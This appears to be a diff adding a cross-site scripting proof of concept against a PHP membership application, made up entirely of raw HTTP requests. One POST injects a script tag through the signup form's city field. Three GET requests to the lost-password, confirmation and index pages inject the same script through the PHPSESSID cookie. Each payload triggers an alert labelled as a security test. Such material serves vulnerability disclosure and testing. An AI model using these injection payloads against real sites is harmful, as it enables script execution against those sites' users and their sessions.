@@ -1,0 +1,21 @@
+POST http://www.example.com:80/insertmember.php HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: target.xx
+Content-Length: 152
+uname=1&amp;add=1&amp;city=&quot;&gt;&lt;script&gt;alert(/Ellipsis+Security+Test/)&lt;/script&gt;&amp;state=1&amp;country=0&amp;url=http%3A%2F%2F&amp;email=1&amp;pwd=1&amp;pwd2=1&amp;submit=Signup
+---
+GET http://www.example.com:80/lostpassword.php HTTP/1.0
+Accept: */*
+Host: www.example.com 
+Cookie: PHPSESSID=&quot;&gt;&lt;script&gt;alert(/Ellipsis+Security+Test/)&lt;/script&gt;
+---
+GET http://www.example.com:80/gen_confirm_mem.php HTTP/1.0
+Accept: */*
+Host: www.example.com 
+Cookie: PHPSESSID=&quot;&gt;&lt;script&gt;alert(/Ellipsis+Security+Test/)&lt;/script&gt;
+---
+GET http://www.example.com:80/index.php HTTP/1.0
+Accept: */*
+Host: www.example.com 
+Cookie: PHPSESSID=&quot;&gt;&lt;script&gt;alert(/Ellipsis+Security+Test/)&lt;/script&gt;
